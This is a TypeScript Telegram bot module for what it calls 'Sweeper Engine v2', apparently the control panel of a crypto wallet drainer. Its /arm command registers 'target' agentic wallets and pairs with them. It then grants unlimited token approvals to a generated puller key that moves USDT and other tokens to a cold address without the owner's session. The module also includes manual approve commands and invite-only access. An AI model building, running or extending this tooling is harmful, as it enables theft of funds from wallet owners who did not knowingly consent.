import { Telegraf } from 'telegraf';
import { authGuard } from './middleware';
import { mainKeyboard, adminKeyboard } from './keyboards';
import {
  upsertTarget, deactivate, listActive, newPuller, addToken, findTarget,
} from '../engine/storage';
import { grantAllowance, signin, verify } from '../engine/baw';
import { allowanceOf, gasOf } from '../engine/puller';
import { USDT } from '../config/constants';
import { ENV } from '../config/env';
import { db } from '../config/db';

export function buildBot() {
  const bot = new Telegraf(ENV.TOKEN);
  bot.catch((e, ctx) => console.error(`[bot] ${ctx.updateType}:`, e));
  bot.use(authGuard);

  bot.start(async ctx => {
    await ctx.reply('⚡ *Sweeper Engine v2*\n\nPuller mode.', {
      parse_mode: 'Markdown', ...mainKeyboard,
    });
  });

  bot.command('menu', ctx =>
    ctx.reply('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard }));

  bot.command('admin', ctx =>
    ctx.reply('*Admin*', { parse_mode: 'Markdown', ...adminKeyboard }));

  /**
   * /arm <agentic_wallet> <cold_destination> [token,...]
   * One puller per target. USDT is added by default.
   */
  bot.command('arm', async ctx => {
    const [, target, cold, extra] = ctx.message.text.split(' ');
    if (!target || !cold) {
      return ctx.reply('Usage: `/arm <agentic_wallet> <cold> [token1,token2]`', { parse_mode: 'Markdown' });
    }
    const userId = ctx.from!.id;
    const { address: puller, key } = newPuller();
    const instanceId = crypto.randomUUID();
    const tokens = [USDT, ...(extra ? extra.split(',').map(s => s.trim()) : [])];

    await upsertTarget({ userId, target, destination: cold, puller, pullerKey: key, instanceId, tokens });

    await ctx.reply(
      `*Registered*\nWallet: \`${target}\`\nPuller: \`${puller}\`\nCold: \`${cold}\`\nTokens: ${tokens.length}\n\n` +
      `Pairing now to grant allowances. Developer Mode must be ON.`,
      { parse_mode: 'Markdown' },
    );

    const s = { dir: `t${target}`, instanceId };
    try {
      const { data } = await signin(s);
      await ctx.reply(`*Pair once:*\n\`${data.pairingCode}\`\n${data.urlForWeb}`,
        { parse_mode: 'Markdown', link_preview_options: { is_disabled: true } });
      await verify(s, data.qrCodeId);

      for (const t of tokens) {
        try { await grantAllowance(s, t, puller); }
        catch (e: any) {
          await ctx.reply(
            `⚠️ Approve failed for \`${t}\`. Manual:\n` +
            `\`baw contract-call preview --binanceChainId 56 --to ${t} --function "approve(address,uint256)" --args "${puller},MAX_UINT"\``,
            { parse_mode: 'Markdown' });
        }
      }
      await ctx.reply('✅ Done. Fund the puller with BNB and it runs without a session.');
    } catch (e: any) {
      await ctx.reply(`❌ Pairing failed: \`${String(e.stdout || e.message).slice(0, 140)}\``,
        { parse_mode: 'Markdown' });
    }
  });

  bot.command('addtoken', async ctx => {
    const [, target, token] = ctx.message.text.split(' ');
    if (!target || !token) return ctx.reply('Usage: `/addtoken <wallet> <token>`', { parse_mode: 'Markdown' });
    const id = await findTarget(ctx.from!.id, target);
    if (!id) return ctx.reply('Unknown wallet. /arm first.');
    await addToken(id, token);
    await ctx.reply(`Added \`${token}\`. Grant the allowance:\n` +
      `\`baw contract-call preview --binanceChainId 56 --to ${token} --function "approve(address,uint256)" --args "<puller>,MAX_UINT"\``,
      { parse_mode: 'Markdown' });
  });

  bot.command('unlink', async ctx => {
    const target = ctx.message.text.split(' ')[1];
    if (!target) return ctx.reply('Usage: `/unlink <wallet>`', { parse_mode: 'Markdown' });
    await deactivate(ctx.from!.id, target);
    await ctx.reply(`Removed \`${target}\``, { parse_mode: 'Markdown' });
  });

  bot.action('MONITORS', async ctx => {
    await ctx.answerCbQuery();
    const rows = await listActive(ctx.from!.id);
    if (!rows.length) return ctx.reply('No targets. /arm first.');
    const body = await Promise.all(rows.map(async r => {
      const lines = await Promise.all(r.tokens.map(async tok => {
        const a = r.puller ? await allowanceOf(r.target, r.puller, tok.token) : 0n;
        return `  ${tok.token} allowance ${a > 0n ? 'OK' : '❌'}`;
      }));
      return `• \`${r.target}\` → \`${r.destination}\`\n  puller \`${r.puller}\`\n${lines.join('\n')}`;
    }));
    await ctx.reply(`*Monitors*\n\n${body.join('\n\n')}`, { parse_mode: 'Markdown' });
  });

  bot.action('FUND', async ctx => {
    await ctx.answerCbQuery();
    const rows = await listActive(ctx.from!.id);
    const lines = await Promise.all(rows.map(async r =>
      `\`${r.puller}\` — ${r.puller ? Number(await gasOf(r.puller)) / 1e18 : 0} BNB`));
    await ctx.reply(`*Fund these pullers:*\n\n${lines.join('\n') || 'none'}`, { parse_mode: 'Markdown' });
  });

  bot.action('ADDTOKEN', async ctx => {
    await ctx.answerCbQuery();
    await ctx.reply('Use `/addtoken <wallet> <token_address>`', { parse_mode: 'Markdown' });
  });

  bot.action('INVITE', async ctx => {
    if (ctx.from!.id !== ENV.ADMIN_ID) return ctx.answerCbQuery('Admin only');
    await ctx.answerCbQuery();
    const code = 'BEE-' + Math.random().toString(36).slice(2, 8).toUpperCase();
    await db.query(`INSERT INTO invite_codes (code) VALUES ($1) ON CONFLICT DO NOTHING`, [code]);
    await ctx.reply(`\`${code}\`\nhttps://t.me/${ctx.botInfo?.username}?start=${code}`, { parse_mode: 'Markdown' });
  });

  bot.action('USERS', async ctx => {
    if (ctx.from!.id !== ENV.ADMIN_ID) return ctx.answerCbQuery('Admin only');
    await ctx.answerCbQuery();
    const { rows } = await db.query(`SELECT user_id FROM authorized_users`);
    await ctx.reply(`Authorized: ${rows.length}`, { parse_mode: 'Markdown' });
  });

  bot.action('MENU', async ctx => {
    await ctx.answerCbQuery();
    await ctx.editMessageText('⚡ *Sweeper Engine v2*', { parse_mode: 'Markdown', ...mainKeyboard });
  });

  return bot;
}
